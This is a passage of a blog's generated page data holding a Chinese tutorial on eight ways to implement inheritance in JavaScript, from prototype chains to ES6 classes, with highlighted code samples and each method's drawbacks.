</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>缺点：</strong></p>\n<ol>\n<li>无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用）</li>\n<li>在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式</li>\n</ol>\n<h2 id=\"3-原型链-借用构造函数继承\"><a href=\"#3-原型链-借用构造函数继承\" class=\"headerlink\" title=\"3. 原型链 + 借用构造函数继承\"></a>3. 原型链 + 借用构造函数继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"comment\">//继承方法</span></span><br><span class=\"line\"> SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\"> SubType.prototype.constructor = SubType;</span><br><span class=\"line\"> SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">&quot;Nicholas&quot;</span>, <span class=\"number\">29</span>);</span><br><span class=\"line\"> instance1.colors.push(<span class=\"string\">&quot;black&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">console</span>.log(instance1.colors); <span class=\"comment\">//&quot;red,blue,green,black&quot;</span></span><br><span class=\"line\"> instance1.sayName(); <span class=\"comment\">//&quot;Nicholas&quot;;</span></span><br><span class=\"line\"> instance1.sayAge(); <span class=\"comment\">//29</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">&quot;Greg&quot;</span>, <span class=\"number\">27</span>);</span><br><span class=\"line\"> <span class=\"built_in\">console</span>.log(instance2.colors); <span class=\"comment\">//&quot;red,blue,green&quot;</span></span><br><span class=\"line\"> instance2.sayName(); <span class=\"comment\">//&quot;Greg</span></span><br></pre></td></tr></table></figure>\n\n<p>说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式</p>\n<p>缺点：</p>\n<ol>\n<li>会调用两次超类型构造函数</li>\n</ol>\n<h2 id=\"4-混入式继承\"><a href=\"#4-混入式继承\" class=\"headerlink\" title=\"4. 混入式继承\"></a>4. 混入式继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyClass</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  SuperClass.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">  OtherSuperClass.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 继承一个类</span></span><br><span class=\"line\">MyClass.prototype = <span class=\"built_in\">Object</span>.create(SuperClass.prototype);</span><br><span class=\"line\"><span class=\"comment\">// 混合其它</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.assign(MyClass.prototype, OtherSuperClass.prototype);</span><br><span class=\"line\"><span class=\"comment\">// 重新指定constructor</span></span><br><span class=\"line\">MyClass.prototype.constructor = MyClass;</span><br><span class=\"line\"></span><br><span class=\"line\">MyClass.prototype.myMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-原型式继承\"><a href=\"#5-原型式继承\" class=\"headerlink\" title=\"5. 原型式继承\"></a>5. 原型式继承</h2><p><strong>原型式继承</strong>适用于一个对象继承自另一个对象的情况，可以不必引入构造函数</p>\n<p>ECMAScript5 通过新增 Object.create()方法规范化了<strong>原型式继承</strong>。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\"> name: <span class=\"string\">&quot;Nicholas&quot;</span>,</span><br><span class=\"line\"> friends: [<span class=\"string\">&quot;Shelby&quot;</span>, <span class=\"string\">&quot;Court&quot;</span>, <span class=\"string\">&quot;Van&quot;</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">&quot;Greg&quot;</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">&quot;Rob&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">&quot;Linda&quot;</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">&quot;Barbie&quot;</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">// &quot;Shelby,Court,Van,Rob,Barbie&quot; </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟 Object.create() 方法</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.$create = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">original</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;&#125;;</span><br><span class=\"line\">  fn.prototype = original;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> fn();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样</p>\n</blockquote>\n<h2 id=\"6-寄生式继承\"><a href=\"#6-寄生式继承\" class=\"headerlink\" title=\"6. 寄生式继承\"></a>6. 寄生式继承</h2><p><strong>寄生式继承</strong>是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createAnother</span>(<span class=\"params\">original</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> clone = <span class=\"built_in\">Object</span>.create(original); <span class=\"comment\">// 通过调用函数创建一个新对象</span></span><br><span class=\"line\">  clone.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;  <span class=\"comment\">//以某种方式来增强这个对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;hi&quot;</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> clone; <span class=\"comment\">//返回这个对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&quot;Nicholas&quot;</span>,</span><br><span class=\"line\">  friends: [<span class=\"string\">&quot;Shelby&quot;</span>, <span class=\"string\">&quot;Court&quot;</span>, <span class=\"string\">&quot;Van&quot;</span>],</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = createAnother(person);</span><br><span class=\"line\">anotherPerson.sayHi(); <span class=\"comment\">//&quot;hi&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>缺点：</p>\n<ol>\n<li>需要在构造函数中给每个对象添加函数，导致不能复用函数</li>\n</ol>\n<h2 id=\"7-寄生-原型链继承\"><a href=\"#7-寄生-原型链继承\" class=\"headerlink\" title=\"7. 寄生 + 原型链继承\"></a>7. 寄生 + 原型链继承</h2><p><strong>寄生 + 原型链是引用类型最理想的继承范式</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inheritPrototype</span>(<span class=\"params\">subType, superType</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> prototype = <span class=\"built_in\">Object</span>.create(superType.prototype); <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  prototype.constructor = subType; <span class=\"comment\">//增强对象</span></span><br><span class=\"line\">  subType.prototype = prototype; <span class=\"comment\">//指定对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  SuperType.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\"></span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"8-Class-继承\"><a href=\"#8-Class-继承\" class=\"headerlink\" title=\"8. Class 继承\"></a>8. Class 继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">name</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"title\">sayHello</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">sayName</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;my name is &quot;</span> + <span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Child</span> <span class=\"keyword\">extends</span> <span class=\"title\">Parent</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">name, age</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">sayAge</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;my age is &quot;</span> + <span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.age;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> parent = <span class=\"keyword\">new</span> Parent(<span class=\"string\">&quot;Parent&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> child = <span class=\"keyword\">new</span> Child(<span class=\"string\">&quot;Child&quot;</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;parent: &quot;</span>, parent); <span class=\"comment\">// parent:  Parent &#123;name: &quot;Parent&quot;&#125;</span></span><br><span class=\"line\">Parent.sayHello(); <span class=\"comment\">// hello</span></span><br><span class=\"line\">parent.sayName(); <span class=\"comment\">// my name is Parent</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;child: &quot;</span>, child); <span class=\"comment\">// child:  Child &#123;name: &quot;Child&quot;, age: 18&#125;</span></span><br><span class=\"line\">Child.sayHello(); <span class=\"comment\">// hello</span></span><br><span class=\"line\">child.sayName(); <span class=\"comment\">// my name is Child</span></span><br><span class=\"line\">child.sayAge(); <span class=\"comment\">// my age is 18</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 1、构造器原型链</span></span><br><span class=\"line\">Child.__proto__ === Parent; <span class=\"comment\">// true</span></span><br><span class=\"line\">Parent.__proto__ === <span class=\"built_in\">Function</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.__proto__ === <span class=\"literal\">null</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"comment\">// 2、实例原型链</span></span><br><span class=\"line\">child.__proto__ === Child.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\">Child.prototype.__proto__ === Parent.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\">Parent.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.__proto__ === <span class=\"literal\">null</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS-实现继承的几种方式\"><a href=\"#JS-实现继承的几种方式\" class=\"headerlink\" title=\"JS 实现继承的几种方式\"></a>JS 实现继承的几种方式</h1><p>[TOC]</p>\n<h2 id=\"1-原型链继承\"><a href=\"#1-原型链继承\" class=\"headerlink\" title=\"1. 原型链继承\"></a>1. 原型链继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.property = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.property;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.subproperty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//继承了 SuperType</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.getSubValue = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.subproperty;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance.getSubValue()); <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance.getSuperValue()); <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>缺点：</strong></p>\n<ol>\n<li>包含引用类型值的原型属性会被所有实例共享，原型链上的属性为引用类型时，某个实例修改原型链上的属性会导致其他实例也会受到影响</li>\n<li>在创建子类型的实例时，不能向超类型的构造函数中传递参数</li>\n</ol>\n<h2 id=\"2-借用构造函数继承\"><a href=\"#2-借用构造函数继承\" class=\"headerlink\" title=\"2. 借用构造函数继承\"></a>2. 借用构造函数继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"> <span class=\"comment\">//继承了 SuperType</span></span><br><span class=\"line\"> SuperType.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\">instance1.colors.push(<span class=\"string\">&quot;black&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance1.colors); <span class=\"comment\">//&quot;red,blue,green,black&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(instance2.colors); <span class=\"comment\">//&quot;red,blue,green&quot; </span></span><br></pre></td></tr></table></figure>\n\n<p><strong>缺点：</strong></p>\n<ol>\n<li>无法复用函数，因为方法都在构造函数中定义（没有通过原型链引用）</li>\n<li>在超类型的原型中定义的方法，对子类型而言也是不可见的，结果所有类型都只能使用构造函数模式</li>\n</ol>\n<h2 id=\"3-原型链-借用构造函数继承\"><a href=\"#3-原型链-借用构造函数继承\" class=\"headerlink\" title=\"3. 原型链 + 借用构造函数继承\"></a>3. 原型链 + 借用构造函数继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"comment\">//继承方法</span></span><br><span class=\"line\"> SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\"> SubType.prototype.constructor = SubType;</span><br><span class=\"line\"> SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">&quot;Nicholas&quot;</span>, <span class=\"number\">29</span>);</span><br><span class=\"line\"> instance1.colors.push(<span class=\"string\">&quot;black&quot;</span>);</span><br><span class=\"line\"> <span class=\"built_in\">console</span>.log(instance1.colors); <span class=\"comment\">//&quot;red,blue,green,black&quot;</span></span><br><span class=\"line\"> instance1.sayName(); <span class=\"comment\">//&quot;Nicholas&quot;;</span></span><br><span class=\"line\"> instance1.sayAge(); <span class=\"comment\">//29</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">&quot;Greg&quot;</span>, <span class=\"number\">27</span>);</span><br><span class=\"line\"> <span class=\"built_in\">console</span>.log(instance2.colors); <span class=\"comment\">//&quot;red,blue,green&quot;</span></span><br><span class=\"line\"> instance2.sayName(); <span class=\"comment\">//&quot;Greg</span></span><br></pre></td></tr></table></figure>\n\n<p>说明：组合继承避免了原型链和借用构造函数的缺陷，融合了它们的优点，成为 JavaScript 中最常用的继承模式</p>\n<p>缺点：</p>\n<ol>\n<li>会调用两次超类型构造函数</li>\n</ol>\n<h2 id=\"4-混入式继承\"><a href=\"#4-混入式继承\" class=\"headerlink\" title=\"4. 